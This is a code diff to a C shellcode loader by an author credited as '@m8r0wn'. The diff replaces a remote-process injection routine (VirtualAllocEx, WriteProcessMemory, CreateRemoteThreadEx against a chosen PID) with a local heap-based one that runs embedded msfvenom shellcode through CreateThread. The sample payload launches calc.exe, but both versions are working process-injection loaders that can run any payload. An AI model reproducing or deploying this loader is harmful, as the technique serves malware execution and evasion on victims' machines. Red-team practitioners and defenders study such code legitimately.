@@ -1,21 +1,13 @@
 /*
 	Author: @m8r0wn
 	
-	Local shellcode injection using VirtualAllocEx()/CreateRemoteThread(). PID can be defined in 
-	cmd args, or assinged automatically using PidAutoSelect(). 
-	
-	References:
-		https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
+	Local shellcode injection using HeapAlloc()/CreateThread()	
 */
 
-#include <string>
-#include <stdio.h>
-#include <stdlib.h>
 #include <Windows.h>
-#include "PidAutoSelect.h"
+#include <stdio.h>
 
-int main(int argc, char* argv[]) {
-	
+int main() {
 	// msfvenom -a x64 -p windows/x64/exec CMD='calc.exe' -f c
 	unsigned char shellcode[]= "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
 	"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
@@ -37,31 +29,20 @@ int main(int argc, char* argv[]) {
 	"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
 	"\x63\x2e\x65\x78\x65\x00";
 
-	DWORD pid;
-	if (argc > 1) {
-		pid = atoi(argv[1]);
-	} else {
-		PidAutoSelect p;
-		pid = p.GetPid();
-	}
-		
-	PVOID procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-	printf("[*] Opening process handle (PID: %d).\n", pid);
-
-	PVOID memAddr = VirtualAllocEx(procHandle, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-	printf("[*] Allocated Memory at 0x%p.\n", memAddr);
-
-	WriteProcessMemory(procHandle, memAddr, shellcode, sizeof(shellcode), NULL);
-	printf("[*] ShellCode copied into memory.\n");
+	PVOID heapHandle = HeapCreate(NULL, NULL, sizeof(shellcode));
+	PVOID HeapBytes = HeapAlloc(heapHandle, HEAP_ZERO_MEMORY, sizeof(shellcode));
+	printf("[*] Heap allocated in Memory at 0x%p.\n", heapHandle);
+	
+	RtlMoveMemory(heapHandle, shellcode, sizeof(shellcode));
+	printf("[*] Shellcode copied into memory.\n");
 
 	DWORD oldProtect;
-	VirtualProtect(memAddr, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
+	VirtualProtect(heapHandle, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
 	printf("[*] Modified memory protection for execution.\n");
 
-	DWORD threadID;
-	HANDLE sThread = CreateRemoteThreadEx(procHandle, NULL, 0, (PTHREAD_START_ROUTINE)memAddr, NULL, 0, NULL, &threadID);
-	printf("[*] Executed thread in remote process.\n");
+	HANDLE sThread = CreateThread(0, 0, (PTHREAD_START_ROUTINE)heapHandle, 0, 0, 0);
+	printf("[*] Executed thread in current process.\n");
 
-	CloseHandle(procHandle);
+	WaitForSingleObject(sThread, INFINITE);
 	return 0;
 }
